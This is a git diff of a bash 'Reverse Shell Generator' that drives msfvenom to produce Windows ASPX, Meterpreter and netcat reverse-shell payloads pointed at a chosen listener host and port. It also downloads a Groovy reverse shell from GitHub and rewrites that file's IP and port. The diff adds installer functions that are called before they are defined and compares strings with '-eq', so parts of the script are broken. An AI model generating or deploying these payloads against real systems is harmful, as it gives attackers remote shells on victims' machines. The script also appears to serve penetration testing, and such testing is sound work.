@@ -26,16 +26,59 @@ echo "
 # Android APK Reverse Shell
 # OSx Reverse Shell
 
-#Checking whether Requirements are properly Installed or not
-type perl >/dev/null 2>&1 || { echo >&2 "Perl is not installed.  Aborting."; exit 1; }
-type curl >/dev/null 2>&1 || { echo >&2 "curl is not installed.  Aborting."; exit 1; }
-type msfvenom >/dev/null 2>&1 || { echo >&2 "Metasploit is not installed or not configured for current User.  Aborting."; exit 1; }
-
 #Checking whether script running as root or not
 if [ "$EUID" -ne 0 ]
   then echo "Please run as root"
   exit
 fi
+
+#Checking whether Requirements are properly Installed or not
+type perl >/dev/null 2>&1 || { echo >&2 perlinstall ; }
+	#Installing Perl
+	perlinstall(){
+	read -p 'Do you want to install Perl? (y/n)' PER
+	if [[ $PER -eq "y" || $PER -eq "Y" ]]; then
+		sudo apt install perl
+	else
+		exit
+	fi
+}
+
+type curl >/dev/null 2>&1 || { echo >&2 curlinstall ; }
+	#Installing Curl
+	curlinstall(){
+	read -p 'Do you want to install Curl? (y/n)' CUR
+	if [[ $CUR -eq "y" || $CUR -eq "Y" ]]; then
+		sudo apt install curl
+	else
+		exit
+	fi
+
+}
+
+type msfvenom >/dev/null 2>&1 || { echo >&2 metainstall ; }
+	#Installing Metasploit	
+	metainstall() {	
+	read -p 'Do you want to install Metasploit? (y/n)' META
+	if [[ $META -eq "y" || $META -eq "Y" ]]; then
+		cd /opt
+		sudo git clone https://github.com/rapid7/metasploit-framework.git
+		sudo chown -R `whoami` /opt/metasploit-framework
+		cd metasploit-framework
+		rvm --default use ruby-${RUBYVERSION}@metasploit-framework
+		gem install bundler
+		bundle install
+		sudo bash -c 'for MSF in $(ls msf*); do ln -s /opt/metasploit-framework/$MSF /usr/local/bin/$MSF;done'
+		echo "export PATH=$PATH:/usr/lib/postgresql/10/bin" >> ~/.bashrc
+		. ~/.bashrc 
+		sudo usermod -a -G postgres `whoami`
+		sudo su - `whoami`
+		./msfdb init
+		msfconsole
+	else 
+		exit
+	fi
+}
 
 echo "======================================"
 echo '[+] Welcome to Reverse Shell Generator'
@@ -80,8 +123,8 @@ read -p '[+] Select Payload Format:
 :' F 
 
 read -p '[+] Payload Option:
-	1. Meterpreter
-	2. Simple_Netcat
+	1. Simple_Netcat
+	2. Meterpreter
 :' PAYLOAD
 	
 #   MSFVENOM
@@ -289,10 +332,13 @@ simple_netcat(){
 
 			elif [[ $AR -eq "1" && $SU -eq "1" ]]; then
 				#aspx staged windows 32 bit
-				msfvenom -p windows/shell/reverse_tcp LHOST=LH LPORT=$LP -f aspx > $OUT
+				msfvenom -p windows/shell/reverse_tcp LHOST=$LH LPORT=$LP -f aspx > $OUT
 			elif [[ $AR -eq "2" && $SU -eq "1" ]]; then
 				#aspx staged windows 64 bit
 				msfvenom -p windows/x64/shell/reverse_tcp LHOST=$LH LPORT=$LP -f aspx > $OUT
+			else
+				echo "No Payload Type Selected"
+				exit
 			fi
 			echo "Saved in $OUT"
 	fi
@@ -301,6 +347,8 @@ simple_netcat(){
 	#####   #####
 	#JSP#	#WAR#
 	#####   #####
+
+	#Java Simple Netcat
 
 	if [[ $F -eq "5" ]]; then
 		read -p '[+] Payload Type:
@@ -324,6 +372,9 @@ simple_netcat(){
 				curl https://raw.githubusercontent.com/Sentinal920/Pentest-Tools/master/Reverse_Shells/Revlin.groovy -o $OUT
 				perl -pi -e 's/127.0.0.1/'$LH'/g' $OUT
 				perl -pi -e 's/920/'$LP'/g' $OUT
+			else
+				echo "No Payload Type Selected"
+				exit
 
 			fi
 	fi
@@ -332,19 +383,19 @@ simple_netcat(){
 	#python#
 	########
 			#python
-			#msfvenom -p cmd/unix/reverse_python LHOST=<Local IP Address> LPORT=<Local Port> -f raw > shell.py
+			#msfvenom -p cmd/unix/reverse_python LHOST=$LH LPORT=$LP -f raw > $OUT
 	
 	######	
 	#bash#
 	######	
 			#bash
-			#msfvenom -p cmd/unix/reverse_bash LHOST=<Local IP Address> LPORT=<Local Port> -f raw > shell.sh
+			#msfvenom -p cmd/unix/reverse_bash LHOST=$LH LPORT=$LP -f raw > $OUT
 
 	######
 	#perl#
 	######
 			#perl
-			#msfvenom -p cmd/unix/reverse_perl LHOST=<Local IP Address> LPORT=<Local Port> -f raw > shell.pl
+			#msfvenom -p cmd/unix/reverse_perl LHOST=$LH LPORT=$LP -f raw > $OUT
 
 
 
@@ -352,17 +403,29 @@ simple_netcat(){
 
 
 if [[ $F -eq "2" && $OS -eq "2" ]]; then
-	echo "Wrong OS Selection: ASP Reverse Shells are supposed to be for Windows "
+	echo "Wrong OS Selection: ASP Reverse Shells are supposed to be for Windows"
 	exit
-elif [[ $F -eq "5" && $OS -eq "2" ]]; then
-	echo "Wrong OS Selection: ASPX Reverse Shells are supposed to be for Windows "
+elif [[ $F -eq "3" && $OS -eq "2" ]]; then
+	echo "Wrong OS Selection: ASPX Reverse Shells are supposed to be for Windows"
+	exit
+elif [[ $F -eq "4" && $OS -eq "2" ]]; then
+	echo "Wrong OS Selection: Powershell Reverse Shells are supposed to  be for Windows"
 	exit
 fi
 
-if [[ $PAYLOAD -eq "1" ]]; then
-	msfvenom_meterpreter
+if [[ $PAYLOAD -eq "2" ]]; then
+	if [[ $F -eq "1" || $F -eq "2" || $F -eq "4" ]]; then
+		msfvenom_meterpreter
+	else
+		echo ""
+		echo "This Payload Fromat doesn't suport Meterpreter"
+		echo ""		
+		echo "Generating Simple Netcat Reverse Shell"
+		echo ""
+		simple_netcat
+	fi
 
-elif [[ $PAYLOAD -eq "2"  ]]; then
+elif [[ $PAYLOAD -eq "1"  ]]; then
 	simple_netcat
 
 else
